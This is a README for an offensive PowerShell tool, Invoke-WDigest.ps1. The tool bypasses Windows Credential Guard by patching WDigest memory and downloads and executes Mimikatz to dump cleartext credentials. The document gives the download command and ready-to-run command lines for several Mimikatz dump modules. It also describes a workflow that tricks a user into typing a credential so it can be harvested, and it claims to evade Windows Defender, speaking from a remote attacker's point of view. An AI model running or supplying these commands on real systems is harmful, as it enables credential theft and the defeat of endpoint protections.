## Invoke-WDigest.ps1

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[Invoke-WDigest](https://github.com/r00t-3xp10it/redpill/blob/main/lib/DeviceGuard/Invoke-WDigest.ps1)|Credential Guard Bypass Via Patching Wdigest Memory|Administrator|Credits: @wh0nsq, @BenjaminDelpy|

<br />

|Parameter|Description|Defaul value|
|---|---|---|
|WDigest|Activate WDigest credential caching in Memory?|<b><i>true</i></b>|
|ManyCats|Switch that downloads\executes Mimikatz to dump credentials *|<b><i>false</i></b>|
|RunAs|Switch that prompts user for credential input and store it in memory|<b><i>false</i></b>|
|DcName|Switch of RunAs command that accepts USER@DOMAIN or DOMAIN\USER<br />Remark: this function requires <b><i>-RunAs</i></b> parameter switch declaration|<b><i>$Env:COMPUTERNAME\\$Env:USERNAME</i></b>|
|Module|Mimikatz selection of dump::modules to auto-run|<b><i>sekurlsa::wdigest exit</i></b>|

<b><i>* Invoke-WDigest.ps1 cmdlet only bypasses mimikatz detection if windows defender its the only AV running in target system.</i></b><br />


<br />

**download Invoke-WDigest.ps1:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
```

<br />

**run cmdlet:**
```powershell
# Cmdlet help
Get-Help .\Invoke-WDigest.ps1 -full

# Execute Mimikatz (interactive shell) without WDigest caching
.\Invoke-WDigest.ps1 -wdigest 'false' -manycats

#  Ativate WDigest caching + Execute Mimikatz 'sekurlsa::wdigest exit'
.\Invoke-WDigest.ps1 -wdigest 'true' -manycats

# Ativate WDigest caching + Execute Mimikatz 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple dump modules.
.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi'


[FAST DEMONSTRATION]

## WDigest caching + dump (-runas) created credential with mimikatz
.\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas

WORKFLOW
   - Invoke-WDigest.ps1 Ativates WDigest caching in memory
   - Invoke-WDigest.ps1 prompts user to enter credential to start cmd.exe
   - WDigest will store (runas) credential input by user in clear-text in memory
   - mimikatz will auto-execute 'mimikatz sekurlsa::wdigest exit' to dump credentials

REMARK
   RunAs parameter switch allows me to pause this cmdlet execution until
   one credential its inputed, then starts cmd.exe with suplied credential
   in a minimized windows (detach from parent). Child process its necessary
   for mimikatz 'sekurlsa::wdigest' to dump the credential from Memory.
   
   [Downside] Cmdlet does not continue execution while the credential its not input, from one
   remote atacker point of view thats bad ( cmdlet execution paused because of -runas command )
```

<br />

![poc](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.png)

<br />

![poc](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest2.png)

<br />

![ProactiveDefense](https://user-images.githubusercontent.com/23490060/219057639-902cc82a-43a3-4391-9927-4b55e532a78c.png)



<br />

<b><i>REMARK:Invoke-WDigest.ps1 cmdlet only bypasses mimikatz detection if windows defender its the only AV running in target system ..</i></b>
